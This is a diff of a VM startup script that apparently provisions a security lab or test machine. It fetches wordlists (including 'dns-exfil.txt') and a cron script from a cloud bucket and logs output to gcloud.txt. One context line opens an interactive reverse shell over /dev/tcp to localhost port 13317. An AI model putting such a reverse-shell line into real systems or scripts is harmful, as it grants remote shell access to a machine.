@@ -19,6 +19,7 @@ if [[ ! -f $SETUPCOMPLETE ]]; then
 
 	gcloud storage cp gs://plat-g-data-store/dns-exfil.txt /usr/share/wordlists/dns-exfil.txt 
 	gcloud storage cp gs://plat-g-data-store/limitedwordlist.txt /usr/share/wordlists/limitedwordlist.txt
+	gcloud storage cp gs://plat-g-data-store/logcron.sh /usr/share/logcron.sh
 
 	# Add Docker's official GPG key:
 	sudo apt-get update
@@ -36,7 +37,7 @@ if [[ ! -f $SETUPCOMPLETE ]]; then
 #the next line creates an empty file so it won't run the next boot
    sudo touch "$SETUPCOMPLETE"
 
-	gcloud storage cp /var/log/startlog.txt gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt
+	gcloud storage cp /var/log/startlog.txt gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> gcloud.txt
  	#shutdown
 else
    echo "Second Run"
@@ -71,7 +72,7 @@ bash -c '/bin/bash -i >& /dev/tcp/localhost/13317 0>&1'
 exec "$@"
 echo "stop test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
-gcloud storage cp log.txt gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt
+gcloud storage cp log.txt gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> gcloud.txt
 #shutdown
 
 fi
